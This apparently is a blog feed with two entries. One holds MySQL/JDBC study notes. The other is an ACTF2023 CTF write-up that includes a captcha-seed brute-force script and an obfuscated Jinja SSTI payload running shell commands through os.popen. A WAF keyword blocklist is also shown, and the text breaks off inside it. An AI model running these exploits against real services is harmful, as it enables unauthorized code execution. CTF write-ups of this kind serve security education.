ACID原则</h2><p>要么都成功，要么都失败</p><p>数据不会丢失，数据完整性保持一致</p><p>事务一旦提交则不可逆，被持久化到数据库中</p><p>不被其他人的操作所影响，所以事务之间要相互隔离</p><p>脏读</p><p>一个事务读取了另外一个事务未提交的数据</p><p>不可重复读</p><p>多次读取，结果不同（不一定是错误，知识某些场合不对）</p><p>幻读</p><p>一个事务内读到了别的事务插入的数据，导致前后读取不一致</p><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>primary key   主键索引</p><p>unique key    唯一索引</p><p>key &#x2F;index   常规索引</p><p>FullText  全文索引</p><h2 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h2><div class="code-wrapper"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> zero identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123456&#x27;</span><span class="hljs-keyword">set</span> <span class="hljs-keyword">password</span> = <span class="hljs-keyword">password</span>(<span class="hljs-string">&#x27;123456&#x27;</span>)<span class="hljs-keyword">set</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">for</span> zero = <span class="hljs-keyword">password</span>(<span class="hljs-string">&#x27;123456&#x27;</span>)<span class="hljs-keyword">rename</span> <span class="hljs-keyword">user</span> zero <span class="hljs-keyword">to</span> zeropeach<span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">on</span> *.* <span class="hljs-keyword">to</span> zero<span class="hljs-keyword">show</span> grants <span class="hljs-keyword">for</span> zero<span class="hljs-keyword">revoke</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">on</span> *.* <span class="hljs-keyword">from</span> zero</code></pre></div><h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><p>拷贝物理文件</p><p>mysqldump</p><div class="code-wrapper"><pre><code class="hljs mysql">mysqldump -h 主机 -u 用户名 -p 数据库 表名 &gt; 位置然后输入密码mysqldump -h localhost -u root -p test teacher &gt; 1.sql也可以连远程</code></pre></div><p>导入</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">source</span> <span class="hljs-number">1</span>.sql</code></pre></div><h2 id="三大范式"><a href="#三大范式" class="headerlink" title="三大范式"></a>三大范式</h2><p>每一列不可再分</p><p>每张表只描述一件事情</p><p>每一列数据都与主键直接相关，而不能间接相关</p><h1 id="jdbc"><a href="#jdbc" class="headerlink" title="jdbc"></a>jdbc</h1><p><code>jdbc:mysql://localhost:3306/数据库名</code></p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> basic.mysql;<span class="hljs-keyword">import</span> java.sql.*;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jdbcfirst</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, SQLException &#123;        Class.forName(<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>);        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://localhost:3306/con?useSSL=true&quot;</span>;        <span class="hljs-type">String</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> DriverManager.getConnection(url, user, password);        <span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> connection.createStatement();        <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select id from student&quot;</span>;        <span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> statement.executeQuery(sql);        <span class="hljs-keyword">while</span>(resultSet.next())&#123;            System.out.println(<span class="hljs-string">&quot;id&quot;</span>+resultSet.getObject(<span class="hljs-string">&quot;id&quot;</span>));        &#125;        resultSet.close();        statement.close();        connection.close();    &#125;&#125;</code></pre></div><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p>statement 执行sql对象</p><p>statement.executeQuery()</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-comment">//获取指定数据类型</span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ResultSet</span>.</span></span>get<span class="hljs-constructor">Object()</span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ResultSet</span>.</span></span>get<span class="hljs-constructor">String()</span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ResultSet</span>.</span></span>get<span class="hljs-constructor">Int()</span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ResultSet</span>.</span></span>get<span class="hljs-constructor">Float()</span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ResultSet</span>.</span></span>get<span class="hljs-constructor">Date()</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs stylus">resultSet<span class="hljs-selector-class">.beforeFirst</span>() 最前面<span class="hljs-function"><span class="hljs-title">afterLast</span><span class="hljs-params">()</span></span>  最后面<span class="hljs-function"><span class="hljs-title">next</span><span class="hljs-params">()</span></span>    <span class="hljs-comment">//下一个数据</span><span class="hljs-function"><span class="hljs-title">previous</span><span class="hljs-params">()</span></span>     <span class="hljs-comment">//前一行</span><span class="hljs-function"><span class="hljs-title">absolute</span><span class="hljs-params">(row)</span></span>   <span class="hljs-comment">//指定行</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs pgsql">resultSet.<span class="hljs-keyword">close</span>()<span class="hljs-keyword">statement</span>.<span class="hljs-keyword">close</span>()<span class="hljs-keyword">connection</span>.<span class="hljs-keyword">close</span>()</code></pre></div><h2 id="statement对象"><a href="#statement对象" class="headerlink" title="statement对象"></a>statement对象</h2><p>statement.executeQuery   （查询）</p><p>statement.executeUpdate      (增删改)</p><h2 id="preparestatement对象"><a href="#preparestatement对象" class="headerlink" title="preparestatement对象"></a>preparestatement对象</h2><div class="code-wrapper"><pre><code class="hljs reasonml">String sql = <span class="hljs-string">&quot;insert test values(?,?,?,?,?)&quot;</span>st = conn.prepare<span class="hljs-constructor">Statement(<span class="hljs-params">sql</span>)</span>;    <span class="hljs-comment">//预编译，不执行</span>st.set<span class="hljs-constructor">Int(1,4)</span>;st.set<span class="hljs-constructor">String(2,<span class="hljs-string">&quot;asd&quot;</span>)</span>;</code></pre></div><p>st.setString(第几个，值)</p><p>使用preparestatement会把传入的数据当成字符，能够防止sql注入</p><h2 id="连接池"><a href="#连接池" class="headerlink" title="连接池"></a>连接池</h2><p>dbcp</p><p>c3p0</p><p>都是Datasource 数据源</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ACTF2023</title>
    <link href="/2023/10/30/ACTF2023/"/>
    <url>/2023/10/30/ACTF2023/</url>
    
    <content type="html"><![CDATA[<h1 id="ACTF2023-复现"><a href="#ACTF2023-复现" class="headerlink" title="ACTF2023 (复现)"></a>ACTF2023 (复现)</h1><blockquote><p>前言</p></blockquote><p>craftcms是我唯一有思路的题目，但我还是没做出来，这次感觉<code>Volcano</code>大佬们有点忙，在星期天下午战绩不佳，但随着Lolita大佬解出第一道web题，由<code>lolita</code>、<code>unknown</code>、<code>lyk</code>师傅三人形成的web主力军一路高歌猛进，在比赛结束前三小时的凌晨六点AK了web题目</p><p>这次比赛给我的反思就是代码审计能力不足，就是连看懂他的功能是什么都很困难，不要说找漏洞了</p><h2 id="story"><a href="#story" class="headerlink" title="story"></a>story</h2><div class="code-wrapper"><pre><code class="hljs kotlin">from flask <span class="hljs-keyword">import</span> Flask, render_template_string, jsonify, request, session, render_template, redirect<span class="hljs-keyword">import</span> randomfrom utils.captcha <span class="hljs-keyword">import</span> Captcha, generate_codefrom utils.minic <span class="hljs-keyword">import</span> *app = Flask(__name__)app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])def index():    username = session.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)    <span class="hljs-keyword">if</span> username != <span class="hljs-string">&quot;&quot;</span> and username <span class="hljs-keyword">is</span> not None:        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;home.html&quot;</span>)    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/captcha&#x27;</span>)def captcha():    gen = Captcha(<span class="hljs-number">200</span>, <span class="hljs-number">80</span>)    buf , captcha_text = gen.generate()    session[<span class="hljs-string">&#x27;captcha&#x27;</span>] = captcha_text    <span class="hljs-keyword">return</span> buf.getvalue(), <span class="hljs-number">200</span>, &#123;        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;image/png&#x27;</span>,        <span class="hljs-string">&#x27;Content-Length&#x27;</span>: str(len(buf.getvalue()))    &#125;<span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])def login():    username = request.json.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)    captcha = request.json.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;captcha&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).upper()    <span class="hljs-keyword">if</span> captcha == session.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;captcha&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).upper():        session[<span class="hljs-string">&#x27;username&#x27;</span>] = username        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;status&#x27;</span>: <span class="hljs-string">&#x27;success&#x27;</span>, <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;login success&#x27;</span>&#125;)    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;status&#x27;</span>: <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;captcha error&#x27;</span>&#125;), <span class="hljs-number">400</span><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/vip&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])def vip():    captcha = generate_code()    captcha_user = request.json.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;captcha&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)    <span class="hljs-keyword">if</span> captcha == captcha_user:        session[<span class="hljs-string">&#x27;vip&#x27;</span>] = True    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;home.html&quot;</span>)<span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/write&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;GET&#x27;</span>])def rename():    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;GET&quot;</span>:        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)    story = request.json.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;story&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)     <span class="hljs-keyword">if</span> session.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;vip&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>):        <span class="hljs-keyword">if</span> not minic_waf(story):            session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&quot;&quot;</span>            session[<span class="hljs-string">&#x27;vip&#x27;</span>] = False            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;status&#x27;</span>: <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;no way~~~&#x27;</span>&#125;)        session[<span class="hljs-string">&#x27;story&#x27;</span>] = story        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;status&#x27;</span>: <span class="hljs-string">&#x27;success&#x27;</span>, <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;success&#x27;</span>&#125;)    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;status&#x27;</span>: <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Please become a VIP first.&#x27;</span>&#125;), <span class="hljs-number">400</span><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/story&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])def story():    story = session.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;story&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)    <span class="hljs-keyword">if</span> story <span class="hljs-keyword">is</span> not None and story != <span class="hljs-string">&quot;&quot;</span>:        tpl = <span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;templates/story.html&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()        <span class="hljs-keyword">return</span> render_template_string(tpl % story)     <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/&quot;</span>)       <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">5001</span>)</code></pre></div><p>大概就是成为VIP然后进行SSTI</p><p>这里如何成为vip就是一大难点</p><p>下面这两个路由是题目的关键</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/captcha&#x27;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">captcha</span>():    gen = Captcha(<span class="hljs-number">200</span>, <span class="hljs-number">80</span>)    buf , captcha_text = gen.generate()    session[<span class="hljs-string">&#x27;captcha&#x27;</span>] = captcha_text    <span class="hljs-keyword">return</span> buf.getvalue(), <span class="hljs-number">200</span>, &#123;        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;image/png&#x27;</span>,        <span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(buf.getvalue()))    &#125;<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/vip&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">vip</span>():    captcha = generate_code()    captcha_user = request.json.get(<span class="hljs-string">&#x27;captcha&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)    <span class="hljs-keyword">if</span> captcha == captcha_user:        session[<span class="hljs-string">&#x27;vip&#x27;</span>] = <span class="hljs-literal">True</span>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;home.html&quot;</span>)</code></pre></div><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Captcha</span>:    lookup_table: t.<span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>] = [<span class="hljs-built_in">int</span>(i * <span class="hljs-number">1.97</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)]    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, width: <span class="hljs-built_in">int</span> = <span class="hljs-number">160</span>, height: <span class="hljs-built_in">int</span> = <span class="hljs-number">60</span>, key: <span class="hljs-built_in">int</span> = <span class="hljs-literal">None</span>, length: <span class="hljs-built_in">int</span> = <span class="hljs-number">4</span>, </span><span class="hljs-params">                 fonts: t.<span class="hljs-type">Optional</span>[t.<span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>]] = <span class="hljs-literal">None</span>, font_sizes: t.<span class="hljs-type">Optional</span>[t.<span class="hljs-type">Tuple</span>[<span class="hljs-built_in">int</span>]] = <span class="hljs-literal">None</span></span>):        self._width = width        self._height = height        self._length = length        self._key = (key <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>(time.time())) + random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>)        self._fonts = fonts <span class="hljs-keyword">or</span> DEFAULT_FONTS        self._font_sizes = font_sizes <span class="hljs-keyword">or</span> (<span class="hljs-number">42</span>, <span class="hljs-number">50</span>, <span class="hljs-number">56</span>)        self._truefonts: t.<span class="hljs-type">List</span>[FreeTypeFont] = []        random.seed(self._key)        .......</code></pre></div><p>这个类中调用了许多的random模块中的方法，并且我们在初始化的时候看到了<code>random.seed(self._key)</code></p><p>设置了种子，那么随机就变得不再随机，一切变得有迹可循</p><p>只要能找到种子，就能根据种子生成成为VIP时需要的验证码</p><p>根据&#x2F;Captcha路由中的</p><div class="code-wrapper"><pre><code class="hljs">gen = Captcha(200, 80)buf , captcha_text = gen.generate()</code></pre></div><p>根据他们对应方法的逻辑和初始化时<code>(key or int(time.time())) + random.randint(1,100)</code>的逻辑，可以写出下面爆破种子的脚本</p><div class="code-wrapper"><pre><code class="hljs livecodeserver">def random_color(<span class="hljs-built_in">start</span>: int, <span class="hljs-keyword">end</span>: int, x=None):    red = <span class="hljs-built_in">random</span>.randint(<span class="hljs-built_in">start</span>, <span class="hljs-keyword">end</span>)    green = <span class="hljs-built_in">random</span>.randint(<span class="hljs-built_in">start</span>, <span class="hljs-keyword">end</span>)    blue = <span class="hljs-built_in">random</span>.randint(<span class="hljs-built_in">start</span>, <span class="hljs-keyword">end</span>)    <span class="hljs-literal">return</span> (red, green, blue)def generate_code(<span class="hljs-built_in">length</span>: int = <span class="hljs-number">4</span>):    <span class="hljs-keyword">characters</span> = <span class="hljs-string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;</span>    <span class="hljs-literal">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">random</span>.choice(<span class="hljs-keyword">characters</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-built_in">length</span>))def test(xt):    <span class="hljs-built_in">random</span>.seed(xt)    code = generate_code()    background = random_color(<span class="hljs-number">238</span>, <span class="hljs-number">255</span>)    color = random_color(<span class="hljs-number">10</span>, <span class="hljs-number">200</span>, <span class="hljs-built_in">random</span>.randint(<span class="hljs-number">220</span>, <span class="hljs-number">255</span>))    <span class="hljs-literal">return</span> codemcode = input(<span class="hljs-string">&quot;lastest code: &quot;</span>).<span class="hljs-built_in">upper</span>()now = int(<span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>())now -=<span class="hljs-number">20</span>        <span class="hljs-comment">#这一步是为了防止随机数过小，在你输入验证码之前就过时间了</span>res = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">120</span>):    ccode = test(now + i).<span class="hljs-built_in">upper</span>()    <span class="hljs-keyword">if</span> ccode == mcode:        print(now + i)        res = now + i        break</code></pre></div><h4 id="我的盲点"><a href="#我的盲点" class="headerlink" title="我的盲点"></a>我的盲点</h4><p>random设置了种子后，是每次运行文件的输出结果都一样，而不是每次随机函数生成的结果一样</p><div class="code-wrapper"><pre><code class="hljs autoit">import <span class="hljs-built_in">random</span><span class="hljs-built_in">random</span>.seed(<span class="hljs-number">0</span>)print(<span class="hljs-built_in">random</span>.<span class="hljs-built_in">random</span>())print(<span class="hljs-built_in">random</span>.<span class="hljs-built_in">random</span>())<span class="hljs-meta">#0.8444218515250481</span><span class="hljs-meta">#0.7579544029403025</span></code></pre></div><p>不管运行多少次，都是上面两个结果</p><div class="code-wrapper"><pre><code class="hljs stylus">import randomrandom<span class="hljs-selector-class">.seed</span>(<span class="hljs-number">0</span>)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(random.random()</span></span>) random<span class="hljs-selector-class">.seed</span>(<span class="hljs-number">0</span>)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(random.random()</span></span>)#<span class="hljs-number">0.8444218515250481</span>#<span class="hljs-number">0.8444218515250481</span>import randomrandom<span class="hljs-selector-class">.seed</span>(<span class="hljs-number">0</span>)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(random.random()</span></span>)random<span class="hljs-selector-class">.seed</span>(<span class="hljs-number">0</span>)random<span class="hljs-selector-class">.randint</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(random.random()</span></span>)#<span class="hljs-number">0.8444218515250481</span>#<span class="hljs-number">0.7579544029403025</span></code></pre></div><p>可以发现random方法的生成结果与设置种子之间调用了多少次random模块中的方法有关（这一部分很重要，看不懂我说的意思可以先去搜索一下）</p><h3 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h3><p>我们根据上面的脚本拿到了种子，然后拿着种子去调用generate_code方法来获取VIP所要的验证码是不成功的</p><p>因为Captcha类中调用了许多random模块中的方法，每调用一次都会影响下一个random模块方法的生成值（只要是random中的方法都会影响）</p><p>所以我们在爆破的同时还要重走一遍题目生成验证码的过程，然后调用一次generate_code方法即可</p><p>重走过程就是跟题目一样执行这两行即可</p><div class="code-wrapper"><pre><code class="hljs">gen = Captcha(200,80,key=xt)buf,captcha_text = gen.generate()</code></pre></div><p>什么意思呢，就是使用爆破的每一个种子生成验证码，若生成相同的即可在爆破出种子的同时也完成了走生成验证码的流程（退出循环），之后调用一次generate_code就是VIP要的验证码</p><p>于是我们要修改上面的脚本</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">random_color</span>(<span class="hljs-params">start: <span class="hljs-built_in">int</span>, end: <span class="hljs-built_in">int</span>, x=<span class="hljs-literal">None</span></span>):    red = random.randint(start, end)    green = random.randint(start, end)    blue = random.randint(start, end)    <span class="hljs-keyword">return</span> (red, green, blue)<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_code</span>(<span class="hljs-params">length: <span class="hljs-built_in">int</span> = <span class="hljs-number">4</span></span>):    characters = <span class="hljs-string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;</span>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(characters) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length))<span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">xt</span>):    gen = Captcha(<span class="hljs-number">200</span>,<span class="hljs-number">80</span>,key=xt)    buf,captcha_text = gen.generate()    <span class="hljs-keyword">return</span> captcha_textmcode = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;lastest code: &quot;</span>).upper()now = <span class="hljs-built_in">int</span>(time.time())now -=<span class="hljs-number">20</span>res = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">120</span>):    ccode = test(now + i).upper()    <span class="hljs-keyword">if</span> ccode == mcode:        <span class="hljs-built_in">print</span>(now + i)        res = now + i        <span class="hljs-keyword">break</span>    url = <span class="hljs-string">f&quot;http://124.70.33.170:23001/vip&quot;</span>xxcode = generate_code()<span class="hljs-built_in">print</span>(xxcode)payload = &#123;    <span class="hljs-string">&quot;captcha&quot;</span>: xxcode&#125;headers = &#123;    <span class="hljs-comment">#&quot;cookie&quot;: xcookie</span>&#125;response = requests.request(<span class="hljs-string">&quot;POST&quot;</span>, url, headers=headers, json=payload, verify=<span class="hljs-literal">False</span>)<span class="hljs-built_in">print</span>(response.text)<span class="hljs-comment">#xcookie = response.headers[&#x27;set-cookie&#x27;]</span><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;exploitcookie:&quot;</span>, response.headers)</code></pre></div><p>这里爆破出种子并发送到vip路由要是同一步进行 （也可以打印出vip的验证码，然后手动输入）</p><p>原因还是设置种子后调用random模块中的方法会影响其他random方法的生成结果</p><p>即使是同一个种子，设置种子执行多个random中的方法后调用generate_code和设置种子直接调用generate_code生成的结果肯定不同</p><p>所以我们的脚本其实很细节，爆破出种子后退出循环（与此同时也完成了重走题目生成验证码的过程），中间没有退出然后调用generate_code，这样就保留了其他random方法的执行</p><p><img src="/../images/ACTF2023/image-20231031000306188.png" alt="image-20231031000306188"></p><h3 id="接着"><a href="#接着" class="headerlink" title="接着"></a>接着</h3><p>然后就是ssti的waf，给了六个waf，用random随机选   （这么看好像就不是那么随机了，但还是搞不太懂，别人好像说这个按照随便一个waf写就行，跟没有似的）</p><p>直接给出lolita大佬的脚本</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestspayload = <span class="hljs-string">&#x27;&#x27;&#x27;&#123;&#123;((lipsum|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,108,111,98,97,108,115,95,95)))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,101,116,105,116,101,109,95,95))(&#x27;%c%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,98,117,105,108,116,105,110,115,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,101,116,105,116,101,109,95,95))(&#x27;ev&#x27;+&#x27;al&#x27;)(&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(10,95,95,105,109,112,111,114,116,95,95,40,34,111,115,34,41,46,112,111,112,101,110,40,34,99,97,116,32,102,108,97,103,34,41,46,114,101,97,100,40,41,10)))&#125;&#125;&#x27;&#x27;&#x27;</span><span class="hljs-built_in">print</span>(payload)rule = [    [<span class="hljs-string">&#x27;\\x&#x27;</span>,<span class="hljs-string">&#x27;[&#x27;</span>,<span class="hljs-string">&#x27;]&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;getitem&#x27;</span>,<span class="hljs-string">&#x27;print&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>,<span class="hljs-string">&#x27;args&#x27;</span>,<span class="hljs-string">&#x27;cookies&#x27;</span>,<span class="hljs-string">&#x27;values&#x27;</span>,<span class="hljs-string">&#x27;getattribute&#x27;</span>,<span class="hljs-string">&#x27;config&#x27;</span>],                   <span class="hljs-comment"># rule 1</span>    [<span class="hljs-string">&#x27;(&#x27;</span>,<span class="hljs-string">&#x27;]&#x27;</span>,<span class="hljs-string">&#x27;getitem&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;print&#x27;</span>,<span class="hljs-string">&#x27;config&#x27;</span>,<span class="hljs-string">&#x27;args&#x27;</span>,<span class="hljs-string">&#x27;values&#x27;</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;\&quot;&#x27;</span>,<span class="hljs-string">&#x27;dict&#x27;</span>,<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-string">&#x27;join&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;set&#x27;</span>],              <span class="hljs-comment"># rule 2</span>    [<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;\&quot;&#x27;</span>,<span class="hljs-string">&#x27;dict&#x27;</span>,<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-string">&#x27;config&#x27;</span>,<span class="hljs-string">&#x27;join&#x27;</span>,<span class="hljs-string">&#x27;\\x&#x27;</span>,<span class="hljs-string">&#x27;)&#x27;</span>,<span class="hljs-string">&#x27;[&#x27;</span>,<span class="hljs-string">&#x27;]&#x27;</span>,<span class="hljs-string">&#x27;attr&#x27;</span>,<span class="hljs-string">&#x27;__&#x27;</span>,<span class="hljs-string">&#x27;list&#x27;</span>,<span class="hljs-string">&#x27;globals&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>],                           <span class="hljs-comment"># rule 3</span>    [<span class="hljs-string">&#x27;[&#x27;</span>,<span class="hljs-string">&#x27;)&#x27;</span>,<span class="hljs-string">&#x27;getitem&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-string">&#x27;config&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;dict&#x27;</span>,<span class="hljs-string">&#x27;doc&#x27;</span>,<span class="hljs-string">&#x27;\\x&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;\&#123;\&#123;&#x27;</span>,<span class="hljs-string">&#x27;mro&#x27;</span>],                          <span class="hljs-comment"># rule 4</span>    [<span 